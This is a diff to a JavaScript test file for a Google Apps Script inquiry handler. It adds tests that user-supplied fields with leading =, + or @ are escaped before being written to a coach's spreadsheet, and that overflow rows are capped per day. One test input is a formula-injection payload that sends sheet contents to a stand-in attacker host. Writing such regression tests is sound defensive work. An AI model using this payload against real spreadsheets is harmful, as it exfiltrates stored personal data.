@@ -15,7 +15,7 @@ const env = await initializeTestEnvironment({
 function load(file, { quota = 100 } = {}) {
   const sent = []
   const cache = new Map()
-  const props = { FIREBASE_PROJECT_ID: 'demo-sp', FIRESTORE_BASE: 'http://127.0.0.1:8080' }
+  const props = { FIREBASE_PROJECT_ID: 'demo-sp', FIRESTORE_BASE: 'http://127.0.0.1:8080', OVERFLOW_SHEET_ID: 'sheet-1' }
   const ctx = {
     sent,
     JSON, Date, Number, String, Object, Infinity,
@@ -24,7 +24,10 @@ function load(file, { quota = 100 } = {}) {
     LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
     PropertiesService: { getScriptProperties: () => ({ getProperty: k => props[k] ?? null }) },
     ContentService: { MimeType: { JSON: 'json' }, createTextOutput: (t) => ({ setMimeType: () => JSON.parse(t) }) },
-    SpreadsheetApp: { openById: () => { throw new Error('no sheet') } },
+    rows: [],
+    SpreadsheetApp: {
+      openById: () => ({ getSheets: () => [{ appendRow: (r) => ctx.rows.push(r) }] }),
+    },
     Utilities: {
       base64DecodeWebSafe: (s) => Buffer.from(s, 'base64url'),
       newBlob: (b) => ({ getDataAsString: () => Buffer.from(b).toString('utf8') }),
@@ -141,6 +144,23 @@ const post = (g, body) => g.doPost({ postData: { contents: JSON.stringify(body) 
   const g4 = load('inquiry.gs', { quota: 40 })
   r = g4.doGet({ parameter: { name: 'N', email: 'a@b.co', message: 'hi' } })
   check('quota reserve protects booking alerts', r.success && g4.sent.length === 0)
+
+  // Over-limit inquiries land in the coach's sheet, where a leading = makes
+  // Sheets execute the cell. These are stored as text instead.
+  const g5 = load('inquiry.gs')
+  const formula = '=IMPORTXML("https://attacker.example/?d="&CONCAT(A1:F99),"//x")'
+  g5.doGet({ parameter: { name: 'First', email: 'dup@b.co', message: 'hi' } })
+  g5.doGet({ parameter: { name: formula, email: 'dup@b.co', message: '+also bad', phone: '@nope' } })
+  const logged = g5.rows[0] || []
+  check('a formula in an inquiry is stored as text', logged[2] === "'" + formula, JSON.stringify(logged[2]))
+  check('+ and @ leads are escaped too', logged[5] === "'+also bad" && logged[4] === "'@nope", JSON.stringify(logged.slice(4)))
+  check('an ordinary name is written unchanged', g5.rows.length === 1 && logged[1] === 'duplicate sender', JSON.stringify(logged[1]))
+
+  // Sheet rows are capped too — tripping a cap deliberately used to be an
+  // unmetered way to append rows all day.
+  const g6 = load('inquiry.gs')
+  for (let i = 0; i < 140; i++) g6.doGet({ parameter: { name: 'N', email: `f${i}@b.co`, message: 'hi' } })
+  check('overflow rows are capped per day', g6.rows.length === 100, g6.rows.length)
 }
 
 await env.cleanup()
